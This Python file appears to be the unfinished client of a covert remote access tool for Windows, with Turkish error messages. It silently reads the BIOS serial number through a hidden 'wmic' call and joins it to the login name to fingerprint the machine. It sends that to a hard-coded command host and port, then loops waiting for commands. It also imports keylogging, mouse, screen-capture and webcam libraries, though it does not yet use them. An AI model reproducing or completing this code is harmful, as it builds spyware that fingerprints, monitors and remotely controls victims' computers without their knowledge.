import io
import os
import pickle
import shutil
import subprocess
import sys
from ctypes import cdll
from logging import Logger
from socket import socket
from threading import Thread
from time import sleep

import cv2
from cv2 import log
from PIL import ImageGrab
from pynput import keyboard, mouse
from win32api import GetLogicalDriveStrings

IP = "192.168.1.50"
PORT = 123

__USERSTRING__ = os.getlogin() + subprocess.check_output('wmic bios get serialnumber',
                                                             shell=True, stdin=subprocess.PIPE,
                                                             stderr=None,creationflags=0x08000000).decode().split('\n')[1].strip()

def connect(ip,port):
    try:
        soket = socket()
        soket.connect((ip,port))
        return soket
    except:
        return None

class App:
    def __init__(self) -> None:
        while True:
            try:
                data = self.soket.recv(1024).decode("utf-8")
                self.commander(data)
            except Exception as e:
                print("Client datası alınamadı: " + str(e))
                self.connect()

    def commander(self,cmd):
        print(cmd)

    def connect(self):
        self.soket = connect(IP,PORT)
        try:
            self.soket.sendall((__USERSTRING__.ljust(100)).encode())
        except Exception as e:
            print("Client datası gönderilemedi: " + str(e))
            self.connect()
            

App()
